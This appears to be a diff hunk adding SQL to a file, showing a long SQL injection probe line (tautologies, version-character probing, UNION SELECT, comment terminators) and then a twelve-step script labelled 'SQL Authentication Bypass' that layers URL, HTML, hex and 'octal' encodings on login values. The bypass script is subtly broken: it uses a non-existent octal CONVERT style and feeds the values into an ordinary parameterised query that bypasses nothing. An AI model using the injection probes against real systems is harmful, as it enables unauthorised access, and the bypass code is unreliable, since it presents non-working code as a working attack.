@@ -5,3 +5,105 @@
 
 SELECT * FROM tablename WHERE columnname=(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)) AND 1=1 AND '%'=' AND 1=0 AND '%'=' AND (SELECT substring(@@version,1,1))='X' AND (SELECT substring(@@version,1,1))='M' AND (SELECT substring(@@version,2,1))='i' AND (SELECT substring(@@version,2,1))='y' AND (SELECT substring(@@version,3,1))='c' AND (SELECT substring(@@version,3,1))='S' AND (SELECT substring(@@version,3,1))='X' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END) AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))=1 AND 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)) AND (SELECT 1)=(CASE WHEN (1=1) THEN 1 ELSE 0 END) AND (SELECT 1)=1 AND (SELECT ' UNION SELECT 1--')=' UNION SELECT 1--' AND (SELECT ' UNION SELECT 1--')=' UNION SELECT 1--' AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND '%'=' AND 1=0 AND '%'='
 
+
+
+
+
+
+-- SQL Authentication Bypass with Context-Specific Decoding and Multiple Encodings
+
+-- Assuming a vulnerable login form with username and password fields
+
+-- Step 1: Context-Specific Decoding
+-- The following code decodes the input using various techniques to bypass authentication
+
+DECLARE @username NVARCHAR(MAX);
+DECLARE @password NVARCHAR(MAX);
+
+SET @username = 'YOUR_USERNAME_HERE';
+SET @password = 'YOUR_PASSWORD_HERE';
+
+-- Step 2: Decoding Discrepancies
+-- The code below handles decoding discrepancies to further bypass authentication
+
+SET @username = REPLACE(@username, N'%20', N' ');
+SET @username = REPLACE(@username, N'%25', N'%');
+SET @password = REPLACE(@password, N'%20', N' ');
+SET @password = REPLACE(@password, N'%25', N'%');
+
+-- Step 3: URL Encoding
+-- The code below URL encodes the input to bypass authentication
+
+SET @username = NCHAR(37) + NCHAR(50) + NCHAR(48) + NCHAR(65) + NCHAR(68) + NCHAR(77) + NCHAR(73) + NCHAR(78) + NCHAR(37);
+SET @password = NCHAR(37) + NCHAR(50) + NCHAR(48) + NCHAR(65) + NCHAR(68) + NCHAR(77) + NCHAR(73) + NCHAR(78) + NCHAR(37);
+
+-- Step 4: Double URL Encoding
+-- The code below double URL encodes the input to bypass authentication
+
+SET @username = REPLACE(@username, N'%', N'%25');
+SET @password = REPLACE(@password, N'%', N'%25');
+
+-- Step 5: HTML Encoding
+-- The code below HTML encodes the input to bypass authentication
+
+SET @username = REPLACE(@username, N'&', N'&amp;');
+SET @password = REPLACE(@password, N'&', N'&amp;');
+
+-- Step 6: XML Encoding
+-- The code below XML encodes the input to bypass authentication
+
+SET @username = REPLACE(@username, N'<', N'&lt;');
+SET @username = REPLACE(@username, N'>', N'&gt;');
+SET @password = REPLACE(@password, N'<', N'&lt;');
+SET @password = REPLACE(@password, N'>', N'&gt;');
+
+-- Step 7: Unicode Escaping
+-- The code below escapes the input using Unicode to bypass authentication
+
+SET @username = NCHAR(0x0025) + NCHAR(0x0032) + NCHAR(0x0030) + NCHAR(0x0041) + NCHAR(0x0044) + NCHAR(0x004D) + NCHAR(0x0049) + NCHAR(0x004E) + NCHAR(0x0025);
+SET @password = NCHAR(0x0025) + NCHAR(0x0032) + NCHAR(0x0030) + NCHAR(0x0041) + NCHAR(0x0044) + NCHAR(0x004D) + NCHAR(0x0049) + NCHAR(0x004E) + NCHAR(0x0025);
+
+-- Step 8: Hex Escaping
+-- The code below escapes the input using hexadecimal encoding to bypass authentication
+
+SET @username = '0x' + CONVERT(VARCHAR(MAX), @username, 2);
+SET @password = '0x' + CONVERT(VARCHAR(MAX), @password, 2);
+
+-- Step 9: Octal Escaping
+-- The code below escapes the input using octal encoding to bypass authentication
+
+SET @username = '0' + CONVERT(VARCHAR(MAX), @username, 8);
+SET @password = '0' + CONVERT(VARCHAR(MAX), @password, 8);
+
+-- Step 10: Multiple Encodings
+-- The code below applies multiple encodings to the input to bypass authentication
+
+SET @username = NCHAR(37) + NCHAR(50) + NCHAR(48) + NCHAR(65) + NCHAR(68) + NCHAR(77) + NCHAR(73) + NCHAR(78) + NCHAR(37);
+SET @username = REPLACE(@username, N'%', N'%25');
+SET @username = REPLACE(@username, N'&', N'&amp;');
+SET @username = REPLACE(@username, N'<', N'&lt;');
+SET @username = REPLACE(@username, N'>', N'&gt;');
+SET @username = '0x' + CONVERT(VARCHAR(MAX), @username, 2);
+SET @username = '0' + CONVERT(VARCHAR(MAX), @username, 8);
+
+SET @password = NCHAR(37) + NCHAR(50) + NCHAR(48) + NCHAR(65) + NCHAR(68) + NCHAR(77) + NCHAR(73) + NCHAR(78) + NCHAR(37);
+SET @password = REPLACE(@password, N'%', N'%25');
+SET @password = REPLACE(@password, N'&', N'&amp;');
+SET @password = REPLACE(@password, N'<', N'&lt;');
+SET @password = REPLACE(@password, N'>', N'&gt;');
+SET @password = '0x' + CONVERT(VARCHAR(MAX), @password, 2);
+SET @password = '0' + CONVERT(VARCHAR(MAX), @password, 8);
+
+-- Step 11: SQL CHAR() Function
+-- The code below uses the CHAR() function to bypass authentication
+
+SET @username = CHAR(65) + CHAR(68) + CHAR(77) + CHAR(73) + CHAR(78);
+SET @password = CHAR(65) + CHAR(68) + CHAR(77) + CHAR(73) + CHAR(78);
+
+-- Step 12: Use the encoded values in the authentication query
+-- Replace the table and column names, and adjust the query as needed
+
+SELECT *
+FROM users
+WHERE username = @username
+  AND password = @password;
